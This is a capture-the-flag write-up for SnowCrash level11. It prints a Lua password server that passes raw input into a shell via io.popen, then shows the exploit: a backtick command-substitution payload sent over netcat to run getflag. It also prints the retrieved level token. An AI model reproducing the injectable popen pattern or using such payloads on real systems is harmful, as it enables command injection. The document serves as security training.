
In this level, we have a Lua script that creates a simple server listening on port 5151. The script asks for a password, hashes it using SHA-1, and compares it with a hardcoded SHA-1 hash value. If the password matches the hardcoded hash, the client is congratulated. Otherwise, the server responds with "Erf nope..".

Lua Script Overview
The script can be found in level11.lua:

``` lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end

while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n")
      else
          client:send("Gz you dumb*\n")
      end
  end

  client:close()
end
```
How the Script Works:
Socket Binding: The script binds to 127.0.0.1 on port 5151 using Lua’s socket library.
Password Input: The server prompts for a password, which it hashes using the SHA-1 algorithm.
Password Comparison: The script compares the SHA-1 hash of the input password with the hardcoded value "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0".
If it matches, the client gets a success message ("Gz you dumb*\n").
If it doesn't match, the server responds with "Erf nope..\n".
Exploitation Plan
The goal is to execute the getflag command to retrieve the flag, but the server only lets us input a password and compares it to a hash. However, we can exploit the shell behavior to run a command during the password input process by using command substitution.

* Steps to Exploit

Connect to the Server: Use netcat (nc) to connect to the server running on 127.0.0.1 at port 5151.

Input Command Substitution: When asked for a password, instead of entering a string, we input a backtick command to run the getflag program and redirect its output to a file.

Retrieve the Flag: The server won’t accept the password because it doesn’t match the hardcoded hash, but the getflag command still runs, and its output is saved to a file of our choice.


##  1: Connect to the Server

``` bash
level11@SnowCrash:~$ nc 127.0.0.1 5151
```

## 2: Exploit the Password Prompt with Command Substitution

When asked for a password, input the following:

``` bash
Password: `getflag > /tmp/flag11`
```

getflag is executed in the shell.
The output (the token) is redirected to /tmp/flag11.

## 3: Check the Flag
After the server responds with "Erf nope..", check the contents of /tmp/flag11:

``` bash
level11@SnowCrash:~$ cat /tmp/flag11
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

## Enter level12 

``` bash
level11@SnowCrash:~$ su level12
Password: fa6v5ateaw21peobuub8ipe6s
```